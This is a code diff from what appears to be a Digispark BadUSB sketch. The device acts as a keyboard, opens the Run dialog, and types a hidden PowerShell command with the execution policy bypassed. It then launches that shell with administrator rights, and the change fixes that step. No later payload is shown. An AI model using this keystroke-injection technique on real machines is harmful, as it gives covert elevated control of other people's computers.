@@ -5,7 +5,7 @@ void setup()
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(100);
-  DigiKeyboard.println("powershell -ExecutionPolicy Bypass -WindowStyle hidden"); 
+  DigiKeyboard.print("powershell -ExecutionPolicy Bypass -WindowStyle hidden"); 
   DigiKeyboard.delay(100);
   DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
   DigiKeyboard.delay(1000);
